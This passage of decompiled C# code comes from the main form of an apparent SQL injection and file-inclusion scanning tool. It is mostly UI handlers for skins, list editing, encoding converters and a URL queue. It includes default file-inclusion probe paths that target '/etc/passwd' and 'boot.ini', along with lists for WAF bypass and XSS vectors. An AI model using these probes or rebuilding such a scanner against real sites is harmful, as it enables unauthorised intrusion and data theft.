						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0016;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_000a:
					num = 2;
					Clipboard.SetText("Jabber: c4rl0s@jabber.ru\r\nEmail: c4rl0s.pt@gmail.com");
					goto IL_0016;
					IL_0016:
					num = 3;
					method_1(Globals.translate_0.GetStr(this, 52));
					break;
					end_IL_0001_2:
					break;
				}
				num = 4;
				Interaction.Beep();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_119(object sender, EventArgs e)
	{
		string text = "XXXXXXXXXXXXXXXX";
		char[] array = text.ToCharArray();
		Array.Reverse(array);
		text = new string(array);
		Clipboard.SetText(text);
		method_1(mnuAboutHWID.Text + " " + text);
	}

	private void method_120(object sender, EventArgs e)
	{
		cmbSkin.SelectedIndex = checked(cmbSkin.SelectedIndex - 1);
	}

	private void method_121(object sender, EventArgs e)
	{
		cmbSkin.SelectedIndex = checked(cmbSkin.SelectedIndex + 1);
	}

	private void method_122(object sender, EventArgs e)
	{
		if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init == null)
		{
			Interlocked.CompareExchange(ref _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init, new StaticLocalInitFlag(), null);
		}
		bool lockTaken = false;
		try
		{
			Monitor.Enter(_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init, ref lockTaken);
			if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init.State == 0)
			{
				_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init.State = 2;
				_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState = 0;
			}
			else if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init.State = 1;
			if (lockTaken)
			{
				Monitor.Exit(_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState_0024Init);
			}
		}
		Cursor.Current = Cursors.WaitCursor;
		Application.DoEvents();
		try
		{
			if (bool_2)
			{
				if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken2 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init, ref lockTaken2);
					if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init.State = 2;
						_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex = -1;
					}
					else if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init.State = 1;
					if (lockTaken2)
					{
						Monitor.Exit(_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex_0024Init);
					}
				}
				if (string.IsNullOrEmpty(Conversions.ToString(cmbSkin.SelectedItem)))
				{
					cmbSkin.SelectedItem = RuntimeHelpers.GetObjectValue(cmbSkin.Items[6]);
				}
				if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState <= 0)
				{
				}
				if (chkSkin.Checked)
				{
					switch (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState)
					{
					case 0:
						_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState = 1;
						break;
					case 2:
						VisualStyler.RestoreApplicationSkin();
						_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState = 1;
						break;
					}
					if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex != cmbSkin.SelectedIndex)
					{
						VisualStyler1.LoadVisualStyle((Stream)Descompress(Assembly.GetExecutingAssembly().GetManifestResourceStream(Conversions.ToString(Operators.ConcatenateObject(cmbSkin.SelectedItem, ".bin")))));
					}
				}
				else
				{
					switch (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState)
					{
					case 1:
						VisualStyler.RemoveApplicationSkin();
						_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState = 2;
						break;
					}
				}
				if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState > 0)
				{
					VisualStyler1.Refresh();
				}
				if (chkSkin.Checked)
				{
					_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024LastIndex = cmbSkin.SelectedIndex;
				}
			}
			btnSkinP.Enabled = cmbSkin.SelectedIndex > 0;
			btnSkinN.Enabled = cmbSkin.SelectedIndex < checked(cmbSkin.Items.Count - 1);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			if (_0024STATIC_0024cmbSkin_SelectedIndexChanged_002420211C12819D_0024SkinState > 0)
			{
				Cursor.Current = Cursors.Default;
			}
		}
	}

	private void method_123(object sender, EventArgs e)
	{
		cmbSkin.Enabled = chkSkin.Checked;
		method_122(null, null);
		btnSkinP.Enabled = chkSkin.Checked & (cmbSkin.SelectedIndex > 0);
		btnSkinN.Enabled = chkSkin.Checked & (cmbSkin.SelectedIndex < checked(cmbSkin.Items.Count - 1));
	}

	private void method_124(object sender, CancelEventArgs e)
	{
		if (mnuPaths.SourceControl is ListViewExt)
		{
			mnuPathEdit.Visible = ((ListViewExt)mnuPaths.SourceControl).SelectedItems.Count == 1;
			mnuPathRem.Visible = ((ListViewExt)mnuPaths.SourceControl).SelectedItems.Count == 1;
		}
		else
		{
			mnuPathEdit.Visible = ((CheckedListBox)mnuPaths.SourceControl).SelectedItems.Count == 1;
			mnuPathRem.Visible = ((CheckedListBox)mnuPaths.SourceControl).SelectedItems.Count == 1;
		}
	}

	private void method_125(object sender, EventArgs e)
	{
		if (mnuPaths.SourceControl is ListViewExt)
		{
			List<string> list = new List<string>();
			ListViewExt listViewExt = ((mnuPaths.SourceControl == lvwLFIpathLinux) ? lvwLFIpathLinux : ((mnuPaths.SourceControl == lvwLFIpathWin) ? lvwLFIpathWin : ((mnuPaths.SourceControl != lvwWafs) ? lvwXSS : lvwWafs)));
			if (listViewExt == lvwWafs)
			{
				using (WafAdd wafAdd = new WafAdd())
				{
					wafAdd.ShowDialog(this);
					if (wafAdd.DialogResult == DialogResult.OK)
					{
						ListViewItem listViewItem = new ListViewItem(wafAdd.txtOutset.Text);
						listViewItem.SubItems.Add(wafAdd.txtEnding.Text);
						listViewExt.Items.Add(listViewItem);
						listViewExt.Sort();
					}
					return;
				}
			}
			foreach (ListViewItem item2 in listViewExt.Items)
			{
				list.Add(item2.Text);
			}
			using PathAdd pathAdd = new PathAdd(list, listViewExt == lvwLFIpathWin, listViewExt == lvwXSS);
			pathAdd.ShowDialog(this);
			if (listViewExt == lvwXSS)
			{
				pathAdd.Text = Globals.translate_0.GetStr(this, 113) + listViewExt.SelectedItems[0].Text;
				pathAdd.Label1.Text = Globals.translate_0.GetStr(this, 112);
			}
			if (pathAdd.DialogResult == DialogResult.OK)
			{
				ListViewItem listViewItem3 = new ListViewItem(pathAdd.txtPath.Text);
				listViewItem3.SubItems.Add(pathAdd.txtKeyword.Text);
				listViewExt.Items.Add(listViewItem3);
				listViewExt.Sort();
			}
			return;
		}
		List<string> list2 = new List<string>();
		CheckedListBox checkedListBox = ((mnuPaths.SourceControl != lstAnalizerUnion) ? lstAnalizerError : lstAnalizerUnion);
		foreach (object item3 in checkedListBox.Items)
		{
			string item = Conversions.ToString(item3);
			list2.Add(item);
		}
		using VectorsAdd vectorsAdd = new VectorsAdd(list2);
		vectorsAdd.ShowDialog(this);
		if (vectorsAdd.DialogResult == DialogResult.OK)
		{
			checkedListBox.Items.Add(vectorsAdd.txtVector.Text, isChecked: true);
		}
	}

	private void method_126(object sender, EventArgs e)
	{
		if (mnuPaths.SourceControl is ListViewExt)
		{
			List<string> list = new List<string>();
			ListViewExt listViewExt = ((mnuPaths.SourceControl == lvwLFIpathLinux) ? lvwLFIpathLinux : ((mnuPaths.SourceControl == lvwLFIpathWin) ? lvwLFIpathWin : ((mnuPaths.SourceControl != lvwWafs) ? lvwXSS : lvwWafs)));
			if (listViewExt == lvwWafs)
			{
				using (WafAdd wafAdd = new WafAdd())
				{
					wafAdd.Text = Globals.translate_0.GetStr(this, 53) + listViewExt.SelectedItems[0].Text;
					wafAdd.txtOutset.Text = listViewExt.SelectedItems[0].Text;
					wafAdd.txtEnding.Text = listViewExt.SelectedItems[0].SubItems[1].Text;
					wafAdd.ShowDialog(this);
					if (wafAdd.DialogResult == DialogResult.OK)
					{
						listViewExt.SelectedItems[0].Text = wafAdd.txtOutset.Text;
						listViewExt.SelectedItems[0].SubItems[1].Text = wafAdd.txtEnding.Text;
						listViewExt.Sort();
					}
					return;
				}
			}
			foreach (ListViewItem item2 in listViewExt.Items)
			{
				if (!item2.Selected)
				{
					list.Add(item2.Text);
				}
			}
			using PathAdd pathAdd = new PathAdd(list, listViewExt == lvwLFIpathWin, listViewExt == lvwXSS);
			if (listViewExt == lvwXSS)
			{
				pathAdd.Text = Globals.translate_0.GetStr(this, 114) + listViewExt.SelectedItems[0].Text;
				pathAdd.Label1.Text = Globals.translate_0.GetStr(this, 112);
			}
			else
			{
				pathAdd.Text = Globals.translate_0.GetStr(this, 54) + listViewExt.SelectedItems[0].Text;
			}
			pathAdd.txtPath.Text = listViewExt.SelectedItems[0].Text;
			pathAdd.txtKeyword.Text = listViewExt.SelectedItems[0].SubItems[1].Text;
			pathAdd.ShowDialog(this);
			if (pathAdd.DialogResult == DialogResult.OK)
			{
				listViewExt.SelectedItems[0].Text = pathAdd.txtPath.Text;
				listViewExt.SelectedItems[0].SubItems[1].Text = pathAdd.txtKeyword.Text;
				listViewExt.Sort();
			}
			return;
		}
		List<string> list2 = new List<string>();
		CheckedListBox checkedListBox = ((mnuPaths.SourceControl != lstAnalizerUnion) ? lstAnalizerError : lstAnalizerUnion);
		foreach (object item3 in checkedListBox.Items)
		{
			string item = Conversions.ToString(item3);
			list2.Add(item);
		}
		using VectorsAdd vectorsAdd = new VectorsAdd(list2);
		vectorsAdd.Text = Conversions.ToString(Operators.ConcatenateObject(Globals.translate_0.GetStr(this, 55), checkedListBox.SelectedItems[0]));
		vectorsAdd.txtVector.Text = Conversions.ToString(checkedListBox.SelectedItem);
		vectorsAdd.ShowDialog(this);
		if (vectorsAdd.DialogResult == DialogResult.OK)
		{
			checkedListBox.Items[checkedListBox.SelectedIndex] = vectorsAdd.txtVector.Text;
		}
	}

	private void method_127(object sender, EventArgs e)
	{
		if (mnuPaths.SourceControl is ListViewExt)
		{
			ListViewExt listViewExt = ((mnuPaths.SourceControl == lvwLFIpathLinux) ? lvwLFIpathLinux : ((mnuPaths.SourceControl == lvwLFIpathWin) ? lvwLFIpathWin : ((mnuPaths.SourceControl != lvwWafs) ? lvwXSS : lvwWafs)));
			listViewExt.Items.Remove(listViewExt.SelectedItems[0]);
			if (listViewExt.Items.Count == 0)
			{
				if (listViewExt == lvwLFIpathLinux)
				{
					ListViewItem listViewItem = new ListViewItem("/etc/passwd");
					listViewItem.SubItems.Add("root:/bin/bash");
					listViewExt.Items.Add(listViewItem);
				}
				else if (listViewExt == lvwLFIpathWin)
				{
					ListViewItem listViewItem2 = new ListViewItem("c:\\\\boot.ini");
					listViewItem2.SubItems.Add("default=multi(");
					listViewExt.Items.Add(listViewItem2);
				}
				else if (listViewExt != lvwWafs && listViewExt != lvwXSS)
				{
				}
			}
		}
		else
		{
			CheckedListBox checkedListBox = ((mnuPaths.SourceControl != lstAnalizerUnion) ? lstAnalizerError : lstAnalizerUnion);
			checkedListBox.Items.Remove(RuntimeHelpers.GetObjectValue(checkedListBox.SelectedItem));
			method_93(null, null);
		}
	}

	private void method_128(object sender, EventArgs e)
	{
		txtHexValue.Text = "";
		txtTextValue.Text = "";
		txtSQLCharValue.Text = "";
		txtResolveAddress.Text = "";
		numPingPort.Value = 80m;
	}

	private void method_129(object sender, EventArgs e)
	{
		bool enabled = !string.IsNullOrEmpty(txtTextValue.Text);
		btnConvertTextToHex.Enabled = enabled;
		butTextToSQLChar.Enabled = enabled;
		btnTextToURLEnconding.Enabled = enabled;
		btnTextToBase64.Enabled = enabled;
	}

	private void method_130(object sender, EventArgs e)
	{
		bool enabled = !string.IsNullOrEmpty(txtHexValue.Text);
		btnHexToText.Enabled = enabled;
		btnURLDecondingToText.Enabled = enabled;
		btnBase64ToText.Enabled = enabled;
	}

	private void method_131(object sender, EventArgs e)
	{
		try
		{
			txtHexValue.Text = Class23.smethod_7(txtTextValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtTextValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_132(object sender, EventArgs e)
	{
		try
		{
			txtTextValue.Text = Class23.smethod_8(txtHexValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtTextValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_133(object sender, EventArgs e)
	{
		try
		{
			txtHexValue.Text = Class15.smethod_0(txtTextValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtHexValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_134(object sender, EventArgs e)
	{
		try
		{
			txtTextValue.Text = Class15.smethod_1(txtHexValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtTextValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_135(object sender, EventArgs e)
	{
		try
		{
			txtHexValue.Text = Class23.smethod_20(txtTextValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtHexValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_136(object sender, EventArgs e)
	{
		try
		{
			txtTextValue.Text = Class23.smethod_19(txtHexValue.Text);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtTextValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_137(object sender, EventArgs e)
	{
		try
		{
			if (chkGroupChar.Checked)
			{
				txtSQLCharValue.Text = Class23.smethod_21(txtTextValue.Text, chkGroupChar.Checked);
			}
			else
			{
				txtSQLCharValue.Text = Class23.smethod_21(txtTextValue.Text, chkGroupChar.Checked, txtSQLCharDelimiter.Text, cmbSQLChar.Text);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			txtSQLCharValue.Text = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_138(object sender, EventArgs e)
	{
		txtSQLCharDelimiter.Enabled = !chkGroupChar.Checked;
		cmbSQLChar.Enabled = !chkGroupChar.Checked;
	}

	private void method_139(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtSQLCharDelimiter.Text))
		{
			txtSQLCharDelimiter.Text = "+";
		}
	}

	private void method_140(object sender, EventArgs e)
	{
		string value = "";
		btnPing.Enabled = false;
		Cursor = Cursors.WaitCursor;
		Application.DoEvents();
		bool flag = default(bool);
		try
		{
			flag = Class22.smethod_0(txtResolveAddress.Text, Convert.ToInt32(numPingPort.Value), value);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			value = ex2.Message;
			ProjectData.ClearProjectError();
		}
		finally
		{
			if (string.IsNullOrEmpty(value))
			{
				value = Globals.translate_0.GetStr(this, 56);
			}
			btnPing.Enabled = true;
			Cursor = Cursors.Default;
			using (new Class8(this))
			{
				if (flag)
				{
					MessageBox.Show(Globals.translate_0.GetStr(this, 57), Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					MessageBox.Show(value, Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
		}
	}

	private void method_141(object sender, EventArgs e)
	{
		txtResolveIP.Text = "";
		txtResolveCountry.Text = "";
		picResolveFlag.Image = null;
		btnPing.Enabled = txtResolveAddress.Text.Length > 3;
	}

	private void method_142(object sender, EventArgs e)
	{
		try
		{
			txtResolveCountry.Text = "";
			picResolveFlag.Image = null;
			string text = "";
			txtResolveAddress.Text = txtResolveAddress.Text.Replace(" ", "");
			bool flag;
			if ((flag = true) != txtResolveAddress.Text.ToLower().StartsWith("http"))
			{
				text = ((flag != txtResolveAddress.Text.Contains(":")) ? txtResolveAddress.Text : txtResolveAddress.Text.Split(':')[0]);
				goto IL_00f0;
			}
			string[] array = Regex.Split(txtResolveAddress.Text.Trim(), "/");
			if (!Information.IsNothing(array) && array.Length >= 2)
			{
				text = array[2];
				goto IL_00f0;
			}
			goto end_IL_0001;
			IL_00f0:
			txtResolveIP.Text = method_85(text).ToString();
			DataGP g_DataGP = Globals.G_DataGP;
			string sIP = txtResolveIP.Text;
			TextBox textBox;
			string sCountry = (textBox = txtResolveCountry).Text;
			PictureBox pictureBox;
			Image oImage = (pictureBox = picResolveFlag).Image;
			string sCountryCode = "";
			g_DataGP.Lookup(sIP, ref sCountry, ref oImage, ref sCountryCode, bUnionContryCode: true);
			pictureBox.Image = oImage;
			textBox.Text = sCountry;
			if (Operators.CompareString(txtResolveCountry.Text, "[--] N/A", TextCompare: false) == 0)
			{
				txtResolveCountry.Clear();
				picResolveFlag.Visible = false;
			}
			else
			{
				picResolveFlag.Visible = true;
			}
			return;
			end_IL_0001:;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		method_1(Globals.translate_0.GetStr(this, 58));
		Interaction.Beep();
	}

	private void method_143(object sender, CancelEventArgs e)
	{
		e.Cancel = Globals.GTrash.method_3() == 0;
		mnuTrashClippboard.Enabled = dtgTrash.SelectedRows.Count > 0;
		mnuTrashRemove.Enabled = dtgTrash.SelectedRows.Count > 0;
		mnuTrashCount.Text = Globals.translate_0.GetStr(this, 59) + Globals.FormatNumbers(Globals.GTrash.method_3());
	}

	private void method_144(object sender, EventArgs e)
	{
		Globals.GTrash.method_7();
	}

	private void method_145(object sender, EventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (dtgQueue.SelectedRows.Count != 1)
			{
				foreach (DataGridViewRow selectedRow in dtgTrash.SelectedRows)
				{
					stringBuilder.AppendLine(Conversions.ToString(selectedRow.Cells[0].Value));
				}
			}
			else
			{
				stringBuilder.AppendLine(Conversions.ToString(dtgTrash.SelectedRows[0].Cells[0].Value));
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_146(object sender, EventArgs e)
	{
		dtgTrash.SelectAll();
	}

	private void method_147(object sender, EventArgs e)
	{
		using (new Class8(this))
		{
			if (MessageBox.Show(Globals.translate_0.GetStr(this, 60) + "\r\n" + Globals.FormatNumbers(Globals.GTrash.method_3()), Text, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
			{
				Globals.GTrash.method_4();
			}
		}
	}

	private void method_148(object sender, EventArgs e)
	{
		try
		{
			foreach (DataGridViewRow selectedRow in dtgTrash.SelectedRows)
			{
				string text = Conversions.ToString(selectedRow.Cells[0].Value);
				Globals.GTrash.method_1(text);
				dtgTrash.Rows.Remove(selectedRow);
				if (DateAndTime.Now.Second % 2 == 0)
				{
					Application.DoEvents();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_149(object sender, KeyEventArgs e)
	{
		if (e.Control)
		{
			if (e.KeyCode == Keys.A)
			{
				method_146(null, null);
			}
		}
		else if (dtgQueue.SelectedRows.Count > 0)
		{
			Keys keyCode = e.KeyCode;
			if (keyCode == Keys.Delete)
			{
				method_148(null, null);
			}
		}
	}

	private void method_150(object sender, EventArgs e)
	{
		using AddURLs addURLs = new AddURLs();
		addURLs.Text = mnuQueueAddURLs.Text;
		addURLs.ShowDialog(this);
		if (addURLs.DialogResult != DialogResult.OK)
		{
			return;
		}
		List<string> list = new List<string>();
		list.AddRange(addURLs.txtURLs.Lines);
		Globals.GQueue.method_12();
		Globals.GQueue.method_3(list);
		Class37.Struct4 @struct = Globals.GQueue.method_13();
		if (@struct.int_7 > 1)
		{
			using (new Class8(this))
			{
				MessageBox.Show(Globals.translate_0.GetStr(this, 72) + Globals.FormatNumbers(@struct.int_7, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 73) + Globals.FormatNumbers(@struct.int_6, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 74) + Globals.FormatNumbers(@struct.int_1, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 75) + Globals.FormatNumbers(@struct.int_5, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 76) + Globals.FormatNumbers(@struct.int_2, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 77) + Globals.FormatNumbers(@struct.int_3, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 78) + Globals.FormatNumbers(@struct.int_4, bIgnoreZero: false) + "\r\n" + Globals.translate_0.GetStr(this, 79) + Globals.FormatNumbers(@struct.int_0, bIgnoreZero: false), addURLs.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
		}
	}

	private void method_151(object sender, CancelEventArgs e)
	{
	}

	private void method_152(object sender, EventArgs e)
	{
		Globals.ShellUrl(Conversions.ToString(dtgQueue.SelectedRows[0].Cells[0].Value));
	}

	private void method_153(object sender, EventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			if (dtgQueue.SelectedRows.Count != 1)
			{
				foreach (DataGridViewRow selectedRow in dtgQueue.SelectedRows)
				{
					stringBuilder.AppendLine(Conversions.ToString(selectedRow.Cells[0].Value));
				}
			}
			else
			{
				stringBuilder.AppendLine(Conversions.ToString(dtgQueue.SelectedRows[0].Cells[0].Value));
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void method_154(object sender, EventArgs e)
	{
		dtgQueue.SelectAll();
	}

	private void method_155(object sender, EventArgs e)
	{
		try
		{
			mnuQueue.Enabled = false;
			tsWorker.Enabled = false;
			List<string> list = new List<string>();
			if (sender != mnuQueueRomove || dtgQueue.SelectedRows.Count != dtgQueue.RowCount)
			{
				foreach (DataGridViewRow selectedRow in dtgQueue.SelectedRows)
				{
					string item = Conversions.ToString(selectedRow.Cells[0].Value);
					list.Add(item);
					if (sender == mnuQueueTrash)
					{
						Globals.GTrash.method_0(item);
					}
					if (DateAndTime.Now.Second % 2 == 0)
					{
						Application.DoEvents();
					}
				}
			}
			if (dtgQueue.SelectedRows.Count == dtgQueue.RowCount)
			{
				Globals.GQueue.method_7();
			}
			else
			{
				Globals.GQueue.method_6(list.ToArray());
			}
			Globals.GQueue.method_4();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			mnuQueue.Enabled = true;
			tsWorker.Enabled = true;
		}
	}

	private void method_156(object sender, MouseEventArgs e)
	{
		if (e.Button != MouseButtons.Right || dtgQueue.RowCount != 0)
		{
			return;
		}
		foreach (ToolStripItem item in mnuQueue.Items)
		{
			item.Visible = enum6_0 == Enum6.const_1;
		}
		mnuQueueAddURLs.Visible = true;
		mnuQueue.Tag = RuntimeHelpers.GetObjectValue(sender);
		mnuQueue.Show(Control.MousePosition);
	}

	private void method_157(object sender, DataGridViewCellMouseEventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ToolStripItem toolStripItem = default(ToolStripItem);
		DataGridView dataGridView = default(DataGridView);
		bool flag = default(bool);
		IEnumerator enumerator = default(IEnumerator);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 940:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001e;
						case 4:
							goto IL_0027;
						case 6:
							goto IL_002b;
						case 7:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 11:
							goto IL_0079;
						case 12:
							goto IL_00a2;
						case 13:
							goto IL_00b6;
						case 15:
							goto IL_00ce;
						case 17:
							goto IL_00e2;
						case 18:
							goto IL_00f6;
						case 19:
							goto IL_011b;
						case 20:
							goto IL_0131;
						case 21:
							goto IL_013d;
						case 22:
							goto IL_0155;
						case 23:
							goto IL_0164;
						case 24:
							goto IL_0197;
						case 25:
							goto IL_01ca;
						case 26:
							goto IL_01fd;
						case 27:
							goto IL_0230;
						case 28:
							goto IL_0247;
						case 29:
							goto IL_027a;
						case 30:
							goto IL_02ad;
						case 31:
							goto IL_02e0;
						case 32:
							goto IL_02f4;
						case 5:
						case 14:
						case 16:
						case 33:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 8:
						case 10:
						case 34:
						case 35:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_011b:
					num = 19;
					toolStripItem.Visible = enum6_0 != Enum6.const_1;
					goto IL_0131;
					IL_0131:
					num = 20;
					goto IL_0134;
					IL_00a2:
					num = 12;
					mnuListView.Tag = RuntimeHelpers.GetObjectValue(sender);
					goto IL_00b6;
					IL_0056:
					num = 7;
					if (dataGridView.IsCurrentCellInEditMode)
					{
						goto end_IL_0001_3;
					}
					goto IL_0063;
					IL_000a:
					num = 2;
					if (e.Button != MouseButtons.Right)
					{
						goto end_IL_0001_3;
					}
					goto IL_001e;
					IL_001e:
					num = 3;
					dataGridView = (DataGridView)sender;
					goto IL_0027;
					IL_0027:
					num = 4;
					flag = true;
					goto IL_002b;
					IL_002b:
					num = 6;
					if (flag == (sender == dtgSQLi) || flag == (sender == dtgFileInclusao) || flag == (sender == dtgSQLiNoInjectable))
					{
						goto IL_0056;
					}
					goto IL_00ce;
					IL_0063:
					num = 9;
					if (dataGridView.Rows.Count == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0079;
					IL_0079:
					num = 11;
					mnuLWSelectAll.Tag = dataGridView.Rows[e.RowIndex].Selected;
					goto IL_00a2;
					IL_00ce:
					num = 15;
					if (flag == (sender == dtgSocks))
					{
						break;
					}
					goto IL_00e2;
					IL_00e2:
					num = 17;
					if (flag != (sender == dtgQueue))
					{
						break;
					}
					goto IL_00f6;
					IL_00f6:
					num = 18;
					enumerator = mnuQueue.Items.GetEnumerator();
					goto IL_0134;
					IL_0134:
					if (enumerator.MoveNext())
					{
						toolStripItem = (ToolStripItem)enumerator.Current;
						goto IL_011b;
					}
					goto IL_013d;
					IL_013d:
					num = 21;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto IL_0155;
					IL_00b6:
					num = 13;
					mnuListView.Show(Control.MousePosition);
					break;
					IL_0155:
					num = 22;
					mnuQueueAddURLs.Visible = true;
					goto IL_0164;
					IL_0164:
					num = 23;
					mnuQueueShell.Visible = (dataGridView.SelectedRows.Count == 1) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_0197;
					IL_0197:
					num = 24;
					mnuQueueClipboard.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_01ca;
					IL_01ca:
					num = 25;
					mnuQueueTrash.Visible = (dataGridView.SelectedRows.Count > 0) & dataGridView.Rows[e.RowIndex].Selected;
					goto IL_01fd;
					IL_01fd:
					num = 26;
